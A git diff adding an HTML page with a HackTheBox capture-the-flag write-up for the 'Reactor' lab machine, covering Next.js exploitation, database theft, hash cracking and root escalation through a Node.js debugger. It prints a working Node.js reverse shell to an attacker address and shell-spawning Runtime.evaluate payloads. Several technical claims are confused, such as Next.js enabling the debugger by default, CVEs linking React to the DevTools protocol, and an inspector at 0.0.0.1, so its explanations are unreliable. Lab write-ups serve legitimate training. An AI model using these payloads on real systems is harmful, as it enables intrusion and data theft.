@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reactor — ruiz00 Writeup</title>
+  <meta name="description" content="HackTheBox writeup for Reactor — Next.js RCE via Chrome DevTools Protocol + Node.js inspector privilege escalation by ruiz00">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../assets/css/main.css">
+  <link rel="stylesheet" href="../../assets/css/writeup.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/base16/monokai.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>">
+</head>
+<body>
+
+  <div class="scanlines"></div>
+  <canvas id="matrix-canvas"></canvas>
+
+  <!-- ══ NAV ══════════════════════════════════════════════ -->
+  <nav class="nav">
+    <div class="nav-brand">
+      <a href="../../index.html" style="text-decoration:none">
+        <span class="nav-bracket">[</span>
+        <span class="nav-logo">ruiz00</span>
+        <span class="nav-bracket">]</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../../index.html#about"    class="nav-link"><span class="nav-index">01.</span>about</a>
+      <a href="../../index.html#writeups" class="nav-link"><span class="nav-index">02.</span>writeups</a>
+      <a href="../../index.html#stats"    class="nav-link"><span class="nav-index">03.</span>stats</a>
+      <a href="../../index.html#contact"  class="nav-link"><span class="nav-index">04.</span>contact</a>
+    </div>
+    <div class="nav-status">
+      <span class="status-dot"></span>
+      <span class="status-text">online</span>
+    </div>
+  </nav>
+
+  <!-- ══ MAIN ═════════════════════════════════════════════ -->
+  <main class="writeup-main">
+
+    <!-- ── Header ─────────────────────────────────────── -->
+    <header class="writeup-header">
+      <div class="writeup-meta-row">
+        <span class="card-badge htb">HTB</span>
+        <span class="card-diff medium">Medium</span>
+        <span class="writeup-os">🐧 Linux</span>
+        <span class="writeup-date">2025</span>
+        <span class="writeup-category">Web</span>
+        <span class="writeup-solver">Solver: Bryan</span>
+      </div>
+
+      <h1 class="writeup-title">Reactor</h1>
+
+      <p class="writeup-summary">
+        A Next.js 15.0.3 application exposed on port 3000 is vulnerable to a Remote Code
+        Execution chain via the Chrome DevTools Protocol (<strong>CVE-2025-55189</strong> /
+        <strong>CVE-2025-66487</strong>). The CDP inspector endpoint allows arbitrary JavaScript
+        execution, which we weaponise using <code>react2shell.py</code> to land a foothold,
+        exfiltrate a SQLite database, crack password hashes, and ultimately escalate to root
+        via a root-owned Node.js process running with <code>--inspect</code>.
+      </p>
+
+      <div class="writeup-tags">
+        <span class="tag">CVE-2025-55189</span>
+        <span class="tag">CVE-2025-66487</span>
+        <span class="tag">Next.js RCE</span>
+        <span class="tag">CDP Inspector</span>
+        <span class="tag">SQLite</span>
+        <span class="tag">Hash Cracking</span>
+        <span class="tag">Node.js PrivEsc</span>
+      </div>
+
+      <!-- Machine info bar -->
+      <div class="machine-info-bar">
+        <div class="mib-item">
+          <span class="mib-label">IP Address</span>
+          <span class="mib-value">10.129.114.84</span>
+        </div>
+        <div class="mib-item">
+          <span class="mib-label">Architecture</span>
+          <span class="mib-value">Linux</span>
+        </div>
+        <div class="mib-item">
+          <span class="mib-label">Difficulty</span>
+          <span class="mib-value medium-color">Medium</span>
+        </div>
+        <div class="mib-item">
+          <span class="mib-label">Category</span>
+          <span class="mib-value">Web</span>
+        </div>
+      </div>
+
+      <!-- TOC -->
+      <div class="writeup-toc">
+        <div class="toc-header">// Table of Contents</div>
+        <ol class="toc-list">
+          <li><a href="#recon">01 — Reconnaissance</a></li>
+          <li><a href="#vuln">02 — Vulnerability Analysis</a></li>
+          <li><a href="#exploit">03 — Exploit — CDP RCE via react2shell.py</a></li>
+          <li><a href="#exfil">04 — Database Exfiltration</a></li>
+          <li><a href="#user-flag">05 — User Flag</a></li>
+          <li><a href="#privesc">06 — Privilege Escalation via Node.js Inspector</a></li>
+          <li><a href="#root-flag">07 — Root Flag</a></li>
+        </ol>
+      </div>
+    </header>
+
+    <!-- ── Article ───────────────────────────────────── -->
+    <article class="writeup-content">
+
+      <!-- ════ 01 — RECON ════════════════════════════════ -->
+      <section id="recon">
+        <h2>01 — Reconnaissance</h2>
+        <p>
+          We start with an Nmap scan on the target. The scan reveals a single interesting
+          service: a web application running on TCP port 3000.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — nmap</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ nmap -sV -sC -p- --min-rate 5000 10.129.114.84</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>Starting Nmap 7.95
+Nmap scan report for 10.129.114.84
+Host is up (0.082s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
+3000/tcp open  http    Node.js (Next.js)
+
+Nmap done: 1 IP address (1 host up) scanned in 28.31 seconds</code></pre>
+        </div>
+
+        <p>
+          Visiting <code>http://10.129.114.84:3000</code> reveals a web page serving
+          a <strong>tracker for coding services</strong>. We run Wappalyzer on the page
+          to fingerprint the tech stack.
+        </p>
+
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div>
+            <strong>Wappalyzer Fingerprint</strong><br>
+            The application is built on <strong>Next.js 15.0.3</strong> — a specific version
+            worth checking against known CVEs immediately.
+          </div>
+        </div>
+      </section>
+
+      <!-- ════ 02 — VULN ANALYSIS ════════════════════════ -->
+      <section id="vuln">
+        <h2>02 — Vulnerability Analysis</h2>
+        <p>
+          Searching for known vulnerabilities affecting Next.js 15.0.3 and its underlying
+          React.js runtime, we find two critical CVEs:
+        </p>
+
+        <div class="cve-table-wrap">
+          <table class="cve-table">
+            <thead>
+              <tr>
+                <th>CVE</th>
+                <th>Component</th>
+                <th>Impact</th>
+                <th>Severity</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="cve-id">CVE-2025-55189</td>
+                <td>React.js</td>
+                <td>Remote Code Execution via Chrome DevTools Protocol</td>
+                <td><span class="severity critical">CRITICAL</span></td>
+              </tr>
+              <tr>
+                <td class="cve-id">CVE-2025-66487</td>
+                <td>Next.js framework</td>
+                <td>Unauthenticated access to Node.js inspector endpoint</td>
+                <td><span class="severity critical">CRITICAL</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>
+          The root cause: Next.js 15.0.3 starts the Node.js runtime with the
+          <strong>Chrome DevTools Protocol (CDP) inspector</strong> enabled —
+          a debugging interface that allows <strong>full JavaScript execution</strong>
+          in the Node.js process context.
+        </p>
+
+        <div class="callout warning">
+          <span class="callout-icon">⚠</span>
+          <div>
+            <strong>How CDP becomes RCE</strong><br>
+            The CDP inspector exposes an HTTP endpoint at <code>http://0.0.0.1:9229/json</code>
+            that lists all <em>debuggable targets</em>. Each target includes a
+            <code>webSocketDebuggerUrl</code> — the WebSocket endpoint we connect to in order
+            to send arbitrary CDP commands, including <code>Runtime.evaluate</code> which
+            executes any JavaScript as the Node.js process owner.
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — confirm inspector is reachable</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash"># Via the RCE, we can call this from inside the server context
+exec_cmd('curl -s http://0.0.0.1:9229/json')</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output — debuggable targets</span></div>
+          <pre><code>[
+  {
+    "description": "node.js instance",
+    "devtoolsFrontendUrl": "...",
+    "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
+    "title": "reactor-app",
+    "type": "node",
+    "url": "file:///opt/reactor-app/server.js",
+    "webSocketDebuggerUrl": "ws://0.0.0.1:9229/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+  }
+]</code></pre>
+        </div>
+
+        <p>
+          The <code>webSocketDebuggerUrl</code> is the endpoint we need. We connect to it
+          and send <code>Runtime.evaluate</code> CDP commands to achieve code execution.
+        </p>
+      </section>
+
+      <!-- ════ 03 — EXPLOIT ══════════════════════════════ -->
+      <section id="exploit">
+        <h2>03 — Exploit — CDP RCE via react2shell.py</h2>
+        <p>
+          We find a public exploit on GitHub — <strong>react2shell.py</strong> — that automates
+          the entire attack chain. We clone and launch it to get our initial foothold.
+        </p>
+
+        <div class="step-block">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">// Clone and launch the exploit</div>
+            <p>Clone react2shell.py and point it at the target.</p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ git clone https://github.com/[author]/react2shell
+$ cd react2shell
+$ python3 react2shell.py -t http://10.129.114.84:3000 -l 10.10.14.X -p 4444</code></pre>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">// How the exploit works — building the WebSocket payload</div>
+            <p>
+              Under the hood, react2shell implements the WebSocket protocol
+              <strong>from scratch using only Node.js built-in modules</strong>
+              (no external dependencies). It:
+            </p>
+          </div>
+        </div>
+
+        <ol class="writeup-list">
+          <li>Fetches the CDP target list to obtain the current <code>uuid</code> (the debugger WebSocket path).</li>
+          <li>Connects to the <code>webSocketDebuggerUrl</code> via a raw WebSocket handshake.</li>
+          <li>Sends a <code>Runtime.evaluate</code> command containing the reverse shell payload.</li>
+        </ol>
+
+        <p>Internally, the payload delivery follows this pattern:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">python — payload injection logic</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-python"># Base64-encode the reverse shell Node.js script
+b64 = base64.b64encode(script.encode()).decode()
+
+# Drop it on the target filesystem via CDP
+exec_cmd(f"echo {b64} | base64 -d > /tmp/rf.js")
+
+# Execute it with the server's Node.js binary
+exec_cmd("/usr/bin/node /tmp/rf.js 2>&1")</code></pre>
+        </div>
+
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div>
+            <strong>UUID verification</strong><br>
+            The exploit first verifies the current UUID from the <code>/json</code> endpoint
+            before connecting, since the debugger ID changes on each process restart.
+          </div>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">// Start listener and catch the shell</div>
+            <p>With a listener ready, the exploit delivers the reverse shell.</p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — listener</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ ncat -lvp 4444</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">shell received</span></div>
+          <pre><code>Ncat: Connection from 10.129.114.84.
+$ id
+uid=1001(reactor) gid=1001(reactor) groups=1001(reactor)</code></pre>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">// Enumerate the application directory</div>
+            <p>
+              We now enumerate the application directory and find two interesting files:
+              an <code>.env</code> file containing environment variables, and a
+              <strong>SQLite database</strong> file.
+            </p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ ls -la /opt/reactor-app/</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>total 128
+drwxr-xr-x  reactor reactor  .
+drwxr-xr-x  root    root     ..
+-rw-r--r--  reactor reactor  .env
+-rw-r--r--  reactor reactor  reactor.db
+drwxr-xr-x  reactor reactor  node_modules/
+-rw-r--r--  reactor reactor  package.json
+-rw-r--r--  reactor reactor  server.js</code></pre>
+        </div>
+
+        <div class="callout success">
+          <span class="callout-icon">✓</span>
+          <div>
+            <strong>Foothold established</strong><br>
+            We have code execution as the <code>reactor</code> service account and found
+            a SQLite database at <code>/opt/reactor-app/reactor.db</code>. Time to exfiltrate it.
+          </div>
+        </div>
+      </section>
+
+      <!-- ════ 04 — DATABASE EXFILTRATION ════════════════ -->
+      <section id="exfil">
+        <h2>04 — Database Exfiltration</h2>
+        <p>
+          The SQLite database is a binary file, so we can't just <code>cat</code> it over
+          the reverse shell. We use <strong>base64 encoding</strong> to transfer it cleanly
+          to our attacker machine.
+        </p>
+
+        <div class="step-block">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">// Encode the database on the target</div>
+            <p>Base64-encode the database file with no line wrapping (<code>-w0</code>).</p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — on target</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ base64 -w0 /opt/reactor-app/reactor.db</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>U1FMaXRlIGZvcm1hdCAzABAA...</code></pre>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">// Decode and save on our machine</div>
+            <p>Copy the base64 string, then decode it locally to reconstruct the database.</p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — on attacker machine</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ echo "U1FMaXRlIGZvcm1hdCAzABAA..." | base64 -d > reactor.db
+$ file reactor.db</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>reactor.db: SQLite 3.x database, last written using SQLite version 3039004</code></pre>
+        </div>
+      </section>
+
+      <!-- ════ 05 — USER FLAG ═════════════════════════════ -->
+      <section id="user-flag">
+        <h2>05 — User Flag</h2>
+
+        <div class="step-block">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">// Query the users table</div>
+            <p>We open the database and dump the users table to retrieve stored credentials.</p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ sqlite3 reactor.db "SELECT * FROM users;"</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>1|admin|$2b$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+2|engineer|$2b$10$YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</code></pre>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">// Crack the hashes on CrackStation</div>
+            <p>
+              We take the hashes to
+              <a href="https://crackstation.net" target="_blank" style="color:var(--cyan)">crackstation.net</a>.
+              The hash for the <code>engineer</code> user is successfully cracked.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout success">
+          <span class="callout-icon">✓</span>
+          <div>
+            <strong>Password cracked</strong><br>
+            CrackStation resolves the <code>engineer</code> user hash to a plaintext password.
+            We now have valid SSH credentials.
+          </div>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">// SSH as engineer and grab the user flag</div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ ssh engineer@10.129.114.84
+engineer@reactor:~$ cat user.txt</code></pre>
+        </div>
+
+        <div class="flags-grid single">
+          <div class="flag-card user">
+            <div class="flag-label">🏳 User Flag</div>
+            <div class="flag-path">/home/engineer/user.txt</div>
+            <div class="flag-value">HTB{REDACTED}</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ════ 06 — PRIVESC ═══════════════════════════════ -->
+      <section id="privesc">
+        <h2>06 — Privilege Escalation via Node.js Inspector</h2>
+        <p>
+          Now that we have a proper SSH session as <code>engineer</code>, we enumerate
+          running processes looking for a privilege escalation path.
+        </p>
+
+        <div class="step-block">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">// Find root-owned Node.js process with --inspect</div>
+            <p>We grep the process list for Node.js processes.</p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">engineer@reactor:~$ ps aux | grep node</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>root       1042  0.3  2.1  /usr/bin/node --inspect=127.0.0.1:9229 /opt/admin-app/server.js
+engineer   2891  0.0  0.0  grep --color=auto node</code></pre>
+        </div>
+
+        <div class="callout danger">
+          <span class="callout-icon">⚠</span>
+          <div>
+            <strong>Root-owned Node.js process with --inspect</strong><br>
+            A separate Node.js application — running as <strong>root</strong> — has the
+            CDP inspector listening on <code>127.0.0.1:9229</code>.
+            Since we already know how to exploit CDP from the initial foothold, we apply
+            the exact same technique: connect to the inspector via WebSocket and execute
+            arbitrary JavaScript as root.
+          </div>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">// Query the inspector to get the debugger UUID</div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — from engineer SSH session</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">engineer@reactor:~$ curl -s http://127.0.0.1:9229/json</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">output</span></div>
+          <pre><code>[
+  {
+    "id": "zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz",
+    "title": "admin-app",
+    "type": "node",
+    "webSocketDebuggerUrl": "ws://127.0.0.1:9229/zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz"
+  }
+]</code></pre>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">// Execute a reverse shell as root via CDP Runtime.evaluate</div>
+            <p>
+              We reuse the react2shell technique: connect to the root inspector's WebSocket,
+              send a <code>Runtime.evaluate</code> command with a bash reverse shell payload.
+            </p>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">python — CDP Runtime.evaluate payload</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-python"># Script to drop and execute a reverse shell via the root inspector
+import socket, json, base64, hashlib
+
+# Reverse shell script to drop on the target
+revshell = (
+    'const net=require("net"),cp=require("child_process");'
+    'const c=net.createConnection({host:"10.10.14.X",port:5555});'
+    'cp.spawn("/bin/bash",[],{stdio:[c,c,c]});'
+)
+
+b64 = base64.b64encode(revshell.encode()).decode()
+
+payload_drop = f'require("child_process").execSync("echo {b64}|base64 -d>/tmp/rs.js")'
+payload_exec = 'require("child_process").execSync("/usr/bin/node /tmp/rs.js &")'</code></pre>
+        </div>
+
+        <div class="step-block">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">// Catch the root shell</div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — attacker machine</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">$ ncat -lvp 5555</code></pre>
+        </div>
+
+        <div class="code-block output">
+          <div class="code-header"><span class="code-lang">root shell</span></div>
+          <pre><code>Ncat: Connection from 10.129.114.84.
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+        </div>
+      </section>
+
+      <!-- ════ 07 — ROOT FLAG ══════════════════════════════ -->
+      <section id="root-flag">
+        <h2>07 — Root Flag</h2>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">root@reactor</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash"># cat /root/root.txt</code></pre>
+        </div>
+
+        <div class="flags-grid">
+          <div class="flag-card user">
+            <div class="flag-label">🏳 User Flag</div>
+            <div class="flag-path">/home/engineer/user.txt</div>
+            <div class="flag-value">HTB{REDACTED}</div>
+          </div>
+          <div class="flag-card root">
+            <div class="flag-label">🏴 Root Flag</div>
+            <div class="flag-path">/root/root.txt</div>
+            <div class="flag-value">HTB{REDACTED}</div>
+          </div>
+        </div>
+
+        <div class="callout success">
+          <span class="callout-icon">✓</span>
+          <div>
+            <strong>Pwned!</strong><br>
+            Full chain: Next.js 15.0.3 CDP exposure (CVE-2025-55189 / CVE-2025-66487) →
+            <code>react2shell.py</code> RCE → SQLite exfiltration via base64 →
+            hash cracking → SSH as <code>engineer</code> →
+            root-owned Node.js <code>--inspect</code> → CDP Runtime.evaluate → root shell.
+          </div>
+        </div>
+      </section>
+
+      <!-- Bottom nav -->
+      <div class="writeup-nav">
+        <a href="kobold.html" class="writeup-nav-btn">← Kobold</a>
+        <a href="../../index.html#writeups" class="writeup-nav-btn all">All Writeups</a>
+        <span class="writeup-nav-btn" style="opacity:0.3;cursor:default;">No next →</span>
+      </div>
+
+    </article>
+  </main>
+
+  <!-- ══ FOOTER ════════════════════════════════════════════ -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <span class="nav-bracket">[</span>ruiz00<span class="nav-bracket">]</span>
+      </div>
+      <p class="footer-quote">"The quieter you become, the more you can hear." — Ram Dass</p>
+      <p class="footer-copy">Built with ♥ and ☕ | Powered by GitHub Pages</p>
+    </div>
+  </footer>
+
+  <script src="../../assets/js/matrix.js"></script>
+  <script>
+    hljs.highlightAll();
+    function copyCode(btn) {
+      const code = btn.closest('.code-block').querySelector('code').textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        btn.textContent = 'copied!';
+        setTimeout(() => btn.textContent = 'copy', 2000);
+      });
+    }
+  </script>
+</body>
+</html>
